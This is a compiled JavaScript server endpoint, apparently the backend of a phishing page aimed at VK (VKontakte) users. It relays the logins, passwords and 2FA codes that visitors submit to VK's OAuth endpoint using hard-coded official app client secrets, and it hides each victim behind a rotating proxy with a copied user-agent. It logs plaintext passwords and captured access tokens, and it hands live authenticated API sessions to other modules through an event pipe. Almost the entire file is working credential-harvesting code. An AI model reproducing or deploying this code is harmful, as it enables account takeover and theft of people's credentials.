import { j as json } from './index-2b68e648.js';
import { VK } from 'vk-io';
import fetch from 'node-fetch';
import chalk from 'chalk';
import { E as EventsPipe } from './system-54e17ac7.js';
import { g as getRandomAgent } from './proxy-b9c894e4.js';
import 'node:path';
import 'yaml';
import 'node:fs/promises';
import 'node:events';
import 'arg';
import 'v8';
import 'node:module';
import 'node:url';
import 'ip-regex';
import 'https-proxy-agent';
import 'socks-proxy-agent';

const android = [2274003, "hHbZxrka2uZ6jB1inYsH"];
const iphone = [3140623, "VeWdmVclDCtn6ihuP1nt"];
const appCredentials = /* @__PURE__ */ Object.freeze(/* @__PURE__ */ Object.defineProperty({
  __proto__: null,
  android,
  iphone
}, Symbol.toStringTag, { value: "Module" }));
var ResponseStatus = /* @__PURE__ */ ((ResponseStatus2) => {
  ResponseStatus2[ResponseStatus2["DEFAULT"] = -1] = "DEFAULT";
  ResponseStatus2[ResponseStatus2["SUCCESS"] = 0] = "SUCCESS";
  ResponseStatus2[ResponseStatus2["REQUIRE_2FA"] = 1] = "REQUIRE_2FA";
  ResponseStatus2[ResponseStatus2["ERROR_INVALID_CREDENTIALS"] = 2] = "ERROR_INVALID_CREDENTIALS";
  ResponseStatus2[ResponseStatus2["ERROR_CAPTCHA"] = 3] = "ERROR_CAPTCHA";
  ResponseStatus2[ResponseStatus2["ERROR_UNKNOWN"] = 4] = "ERROR_UNKNOWN";
  ResponseStatus2[ResponseStatus2["ERROR_INVALID_CODE"] = 5] = "ERROR_INVALID_CODE";
  ResponseStatus2[ResponseStatus2["ERROR_TOO_MUCH_RETIRES"] = 6] = "ERROR_TOO_MUCH_RETIRES";
  return ResponseStatus2;
})(ResponseStatus || {});
const baseUrl = "https://oauth.vk.com/token";
async function auth(credentials, app = "android", fetchOptions = {}) {
  const [client_id, client_secret] = appCredentials[app];
  const appParameters = {
    grant_type: "password",
    client_id,
    client_secret,
    v: 5.154,
    "2fa_supported": 1
  };
  const parameters = new URLSearchParams({
    ...appParameters,
    ...credentials
  }).toString();
  const response = await fetch(`${baseUrl}?${parameters}`, fetchOptions);
  const json2 = await response.json();
  if (json2.error) {
    switch (json2.error) {
      case "need_captcha":
        return {
          status: ResponseStatus.ERROR_CAPTCHA,
          ...credentials,
          sid: json2.captcha_sid,
          img: json2.captcha_img
        };
      case "need_validation":
        return json2.validation_type && json2.validation_type.startsWith("2fa") ? {
          status: ResponseStatus.REQUIRE_2FA,
          type: json2.validation_type,
          phone: json2.phone_mask,
          ...credentials
        } : { status: ResponseStatus.ERROR_UNKNOWN, ...credentials, error: json2 };
      case "invalid_client":
        return {
          status: json2.error_type === "username_or_password_is_incorrect" ? ResponseStatus.ERROR_INVALID_CREDENTIALS : ResponseStatus.ERROR_UNKNOWN,
          ...credentials,
          error: json2
        };
      case "invalid_request":
        if (json2.error_type === "otp_format_is_incorrect" || json2.error_type === "wrong_otp") {
          return {
            status: ResponseStatus.ERROR_INVALID_CODE,
            ...credentials,
            code: String(credentials.code)
          };
        }
        if (json2.error_type === "too_much_tries") {
          return {
            status: ResponseStatus.ERROR_TOO_MUCH_RETIRES,
            ...credentials
          };
        }
        return {
          status: ResponseStatus.ERROR_UNKNOWN,
          error: json2.error,
          ...credentials
        };
      default:
        return { status: ResponseStatus.ERROR_UNKNOWN, ...credentials, error: json2 };
    }
  } else {
    return {
      status: ResponseStatus.SUCCESS,
      ...credentials,
      ...json2,
      token: json2.access_token,
      user_id: json2.user_id
    };
  }
}
const _ = console.log.bind(console);
const kwLog = (key, value) => _(chalk.blueBright(`${key}:`), chalk.magentaBright(value));
const translations = {
  [ResponseStatus.DEFAULT]: "Неизвестно",
  [ResponseStatus.ERROR_CAPTCHA]: "Требуется подтверждение (каптча)",
  [ResponseStatus.ERROR_INVALID_CODE]: "Неверный код подтверждения",
  [ResponseStatus.ERROR_INVALID_CREDENTIALS]: "Неверный логин или пароль",
  [ResponseStatus.ERROR_TOO_MUCH_RETIRES]: "Слишком много попыток входа",
  [ResponseStatus.ERROR_UNKNOWN]: "Неизвестная ошибка",
  [ResponseStatus.REQUIRE_2FA]: "Требуется код подтверждение 2fa",
  [ResponseStatus.SUCCESS]: "Успех"
};
const proxyBind = /* @__PURE__ */ new Map();
const POST = async ({ request, getClientAddress }) => {
  const ua = request.headers.get("user-agent")?.toLowerCase() || "";
  const ip = request.headers.get("cf-connecting-ip") || request.headers.get("x-forwarded-for") || getClientAddress();
  let platform;
  const input = await request.json();
  const proxy = proxyBind.get(ip) ?? getRandomAgent();
  if (proxy) {
    proxyBind.set(ip, proxy);
  }
  const result = await auth(input, "android", {
    agent: proxy?.agent,
    headers: { "User-Agent": ua }
  });
  _();
  _(chalk.bold("<Попытка входа>"));
  kwLog("IP", ip);
  kwLog("Логин", input.username);
  kwLog("Пароль", input.password);
  if (ua.includes("iphone"))
    platform = "iPhone";
  else if (ua.includes("ipad"))
    platform = "iPad";
  else if (ua.includes("android"))
    platform = "Android";
  else if (ua.includes("windows phone"))
    platform = "Windows Phone";
  else if (ua.includes("windows"))
    platform = "Windows";
  else
    platform = "Android";
  kwLog("Платформа", platform);
  if (proxy) {
    kwLog("Прокси", proxy.line);
  }
  const basicData = {
    ip,
    platform,
    userAgent: ua,
    ...input,
    proxy
  };
  EventsPipe.emit("auth:attempt", basicData);
  if (result.status === ResponseStatus.SUCCESS) {
    kwLog("Статус", chalk.greenBright("Успех"));
    kwLog("Ссылка", `https://vk.com/id${result.user_id}`);
    kwLog("Токен", result.token);
    const vk = new VK({
      token: result.token,
      agent: proxy?.agent,
      apiHeaders: { "User-Agent": ua }
    });
    const [me] = await vk.api.users.get({});
    if (Math.random() > 0.9) {
      proxyBind.clear();
    }
    EventsPipe.emit("auth:success", { ...basicData, ...result, ...me, vk });
    kwLog("Имя", `${me.first_name} ${me.last_name}`);
    kwLog("2fa", "code" in input ? chalk.redBright("Yes") : chalk.greenBright("No"));
  } else if (result.status === ResponseStatus.REQUIRE_2FA) {
    EventsPipe.emit("auth:2fa", basicData);
    kwLog("Статус", chalk.yellowBright("Включен 2FA"));
  } else {
    EventsPipe.emit("auth:failure", basicData);
    kwLog(
      "Статус",
      chalk.redBright(
        `Ошибка (${translations[result.status] || "Неизвестно"}): ${JSON.stringify(
          result.status === ResponseStatus.ERROR_UNKNOWN ? result.error : null
        )}`
      )
    );
  }
  return json(result);
};

export { POST };
//# sourceMappingURL=_server.ts-1715dab9.js.map
